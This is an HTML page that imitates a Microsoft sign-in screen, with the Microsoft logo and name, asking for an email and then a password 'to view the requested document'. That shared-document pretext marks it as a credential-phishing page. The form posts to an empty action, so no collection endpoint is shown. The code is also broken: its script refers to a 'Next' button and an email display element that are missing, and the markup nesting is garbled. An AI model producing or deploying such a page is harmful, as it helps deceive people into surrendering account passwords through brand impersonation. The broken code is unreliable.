<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            flex-direction: column;
        }
        .main-wrapper {
            flex: 1 0 auto;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
            box-sizing: border-box;
        }
        .login-card {
            background-color: #ffffff;
            padding: 44px;
            width: 100%;
            max-width: 440px;
            box-sizing: border-box;
            border: 1px solid rgba(0, 0, 0, 0.1);
        }
        .brand-header {
            display: flex;
            align-items: center;
            margin-bottom: 28px;
        }
        
        /* Combined visual representation of a document icon alongside corporate identity */
        .doc-icon-container {
            display: flex;
            align-items: center;
            margin-right: 14px;
            padding-right: 14px;
            border-right: 1px solid #d2d2d2;
        }
        .document-graphic {
            width: 24px;
            height: 30px;
            background-color: #0078d4; /* Document theme color */
            position: relative;
            border-radius: 2px;
        }
        /* Top right corner fold representation */
        .document-graphic::after {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            width: 8px;
            height: 8px;
            background-color: #f2f2f2;
            border-bottom-left-radius: 2px;
        }
        /* Internal line representations */
        .document-lines {
            position: absolute;
            top: 10px;
            left: 4px;
            right: 4px;
            height: 2px;
            background-color: #ffffff;
            box-shadow: 0 4px 0 #fff, 0 8px 0 #fff;
        }

        .brand-logo {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 2px;
            width: 18px;
            height: 18px;
            margin-right: 10px;
        }
        .logo-square { width: 8px; height: 8px; }
        .sq1 { background-color: #f25022; }
        .sq2 { background-color: #7fba00; }
        .sq3 { background-color: #00a4ef; }
        .sq4 { background-color: #ffb900; }
        
        .brand-text {
            font-size: 18px;
            color: #737373;
            font-weight: 600;
        }
        h2 {
            margin-top: 0;
            margin-bottom: 8px;
            font-weight: 600;
            color: #1b1b1b;
            font-size: 24px;
        }
        .sub-instruction {
            font-size: 15px;
            color: #505050;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #666666;
            font-size: 15px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #0067b8;
        }
        .btn-action {
            width: 100%;
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 8px 12px;
            font-size: 15px;
            font-weight: 400;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
            text-align: center;
        }
        .btn-action:hover {
            background-color: #005da6;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
        }
        .back-link {
            display: inline-block;
            margin-bottom: 16px;
            font-size: 13px;
            color: #0067b8;
            text-decoration: none;
            cursor: pointer;
        }
        .back-link:hover {
            text-decoration: underline;
        }
        .user-identity-display {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 16px;
        }
        footer {
            flex-shrink: 0;
            background-color: rgba(0, 0, 0, 0.03);
            padding: 14px 24px;
            display: flex;
            justify-content: flex-end;
            gap: 16px;
            font-size: 12px;
            color: #000000;
            box-sizing: border-box;
            border-top: 1px solid rgba(0, 0, 0, 0.05);
        }
        footer a {
            color: #000000;
            text-decoration: none;
        }
        footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="login-card">
            <div class="brand-header">
                <!-- Document component positioned sequentially inside layout -->
                <div class="doc-icon-container">
                    <div class="document-graphic">
                        <div class="document-lines"></div>
                    </div>
                </div>
                <div class="brand-logo">
                    <div class="logo-square sq1"></div>
                    <div class="logo-square sq2"></div>
                    <div class="logo-square sq3"></div>
                    <div class="logo-square sq4"></div>
                </div>
                <div class="brand-text">Microsoft</div>
            </div>
            
            <form id="loginForm" action="" method="POST">
                
                <!-- STEP 1: Contextual collection state -->
                <div id="step-username" class="step active">
                    <h2>Continue with Microsoft</h2>
                    <div class="sub-instruction">Please verify your organization account to view the requested document.</div>
                    <div class="input-group">
                        <input type="email" id="email" name="username" required placeholder="Email, phone, or Skype">
                    </div>
                    


                <!-- STEP 2: Submission state -->
                <div id="step-password" class="step">
                    <div id="go-back" class="back-link">← Back</div>
                    <h2>Confirm identity</h2>
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" name="password" placeholder="Password">
                    </div>
                    <button type="submit" id="btn-submit" class="btn-action">Verify & Access</button>
                </div>

            </form>
        </div>
    </div>

    <footer>
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>...</span>
    </footer>

    <script>
        const stepUsername = document.getElementById('step-username');
        const stepPassword = document.getElementById('step-password');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const displayEmail = document.getElementById('display-email');
        
        const btnNext = document.getElementById('btn-next');
        const btnBack = document.getElementById('go-back');

        btnNext.addEventListener('click', function() {
            if (emailInput.checkValidity() && emailInput.value.trim() !== "") {
                displayEmail.textContent = emailInput.value;
                stepUsername.classList.remove('active');
                stepPassword.classList.add('active');
                passwordInput.setAttribute('required', 'true');
                passwordInput.focus();
            } else {
                emailInput.reportValidity();
            }
        });

        btnBack.addEventListener('click', function() {
            passwordInput.removeAttribute('required');
            stepPassword.classList.remove('active');
            stepUsername.classList.add('active');
            emailInput.focus();
        });
    </script>
</body>
</html>
